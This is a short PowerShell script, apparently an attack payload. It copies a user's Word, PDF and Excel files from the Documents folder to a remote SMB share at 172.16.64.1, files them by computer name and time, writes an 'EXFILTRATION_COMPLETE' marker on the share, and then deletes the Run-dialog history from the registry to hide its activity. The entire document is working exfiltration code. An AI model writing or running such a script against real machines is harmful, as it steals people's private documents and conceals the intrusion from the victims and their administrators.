$exfil_dir="$Env:UserProfile\Documents"
$exfil_ext="*.docx"
$exfil_ext1="*.pdf"
$exfil_ext2="*.xlsx"
$loot_dir="\\172.16.64.1\s\e\$Env:ComputerName\$((Get-Date).ToString('yyyy-MM-dd_hhmmtt'))"
mkdir $loot_dir
robocopy $exfil_dir $loot_dir $exfil_ext $exfil_ext1 $exfil_ext2 /S /MT /Z
New-Item -Path \\172.16.64.1\s -Name "EXFILTRATION_COMPLETE" -Value "EXFILTRATION_COMPLETE"
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
